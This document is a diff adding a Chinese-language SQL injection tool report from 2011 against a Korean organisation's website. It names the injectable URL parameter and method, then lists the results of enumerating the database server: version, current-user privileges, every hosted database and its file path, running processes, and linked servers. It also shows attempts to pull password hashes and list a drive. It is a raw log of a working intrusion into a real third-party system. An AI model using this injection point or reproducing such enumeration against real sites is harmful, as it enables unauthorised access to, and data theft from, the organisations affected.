@@ -1,0 +1,160 @@
+■漏洞信息:============================================================
+ ·URL:http://www.mrf.or.kr/m4/m4s1.asp?pageno=6&startpage=1&chk=&setext=&bNo=383
+ ·页面标题： 葛官老RFID器烦
+ ·参数:pageno=6&startpage=1&chk=&setext=&bNo=383
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:121.88.6.66
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 08:16:42 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Pragma: no-cache
+cache-control: no-store
+Content-Length: 33421
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 08:15:42 GMT
+Set-Cookie: ASPSESSIONIDQABTABRR=OFNJNFLAENKLCCLFPFCJEJJK; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：mrf.or.kr
+- 用户名：mrf.or.kr
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SVCTAG-HRW9FBX
+- 服务名：MSSQLSERVER
+- 系统用户名：mrf.or.kr
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+edu.karus.or.kr	e:\MSSQL\data\edu.karus.or.kr_Data.MDF	
+forum	e:\MSSQL\data\forum_Data.MDF	
+iconf2010	e:\MSSQL\data\iconf2010_Data.MDF	
+karus	e:\MSSQL\data\karus_Data.MDF	
+master	e:\MSSQL\data\master.mdf	
+model	e:\MSSQL\data\model.mdf	
+mrf.or.kr	e:\MSSQL\data\mrf.or.kr_Data.MDF	
+msdb	e:\MSSQL\data\msdbdata.mdf	
+Northwind	e:\MSSQL\data\northwnd.mdf	
+pubs	e:\MSSQL\data\pubs.mdf	
+regkorea.or.kr	e:\MSSQL\data\regkorea.or.kr_Data.MDF	
+rfidkorea.or.kr	e:\MSSQL\data\rfidkorea.or.kr_Data.MDF	
+rfidkorea2008	e:\MSSQL\data\rfidkorea2008_Data.MDF	
+rfidkorea2009	e:\MSSQL\data\rfidkorea2009_Data.MDF	
+rfidkorea2010	e:\MSSQL\data\rfidkorea2010_Data.MDF	
+rfidusnseminar	e:\MSSQL\data\rfidusnseminar_Data.MDF	
+rfidusnseminar2009	e:\MSSQL\data\rfidusnseminar2009_Data.MDF	
+tempdb	e:\MSSQL\data\tempdb.mdf	
+usnhrdc.or.kr	e:\MSSQL\data\usnhrdc.or.kr_Data.MDF	
+uwf.or.kr	e:\MSSQL\data\uwf.or.kr_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	SVCTAG-HRW9FBX	1660	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	SVCTAG-HRW9FBX	1660	AWAITING COMMAND	SYSTEM	
+Microsoft SQL Server Management Studio - Query	sleeping	CHUL	5356	AWAITING COMMAND		
+Microsoft SQL Server Management Studio - Query	sleeping	CHUL	5356	AWAITING COMMAND		
+Microsoft SQL Server Management Studio	sleeping	CHUL	5356	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SVCTAG-HRW9FBX	SQL Server	SQLOLEDB	SVCTAG-HRW9FBX		SVCTAG-HRW9FBX	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+
+■数据库信息:============================================================
+- 数据库名：mrf.or.kr
+- 用户名：mrf.or.kr
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SVCTAG-HRW9FBX
+- 服务名：MSSQLSERVER
+- 系统用户名：mrf.or.kr
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+edu.karus.or.kr	e:\MSSQL\data\edu.karus.or.kr_Data.MDF	
+forum	e:\MSSQL\data\forum_Data.MDF	
+iconf2010	e:\MSSQL\data\iconf2010_Data.MDF	
+karus	e:\MSSQL\data\karus_Data.MDF	
+master	e:\MSSQL\data\master.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	SVCTAG-HRW9FBX	1660	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	SVCTAG-HRW9FBX	1660	AWAITING COMMAND	SYSTEM	
+Internet Information Services	sleeping	SVCTAG-JRW9FBX	2796	AWAITING COMMAND		
+Internet Information Services	sleeping	SVCTAG-JRW9FBX	2796	AWAITING COMMAND		
+Internet Information Services	sleeping	SVCTAG-JRW9FBX	2796	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SVCTAG-HRW9FBX	SQL Server	SQLOLEDB	SVCTAG-HRW9FBX		SVCTAG-HRW9FBX	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
